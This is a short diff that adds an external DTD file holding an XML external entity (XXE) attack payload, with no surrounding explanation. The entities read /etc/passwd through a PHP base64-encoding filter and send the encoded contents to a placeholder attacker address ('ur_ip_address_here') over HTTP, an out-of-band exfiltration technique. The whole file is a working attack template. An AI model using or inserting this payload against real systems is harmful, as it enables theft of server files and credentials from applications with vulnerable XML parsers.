@@ -1,0 +1,3 @@
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY % trick SYSTEM
+'http://ur_ip_address_here:80/?p=%payl;'>"> 
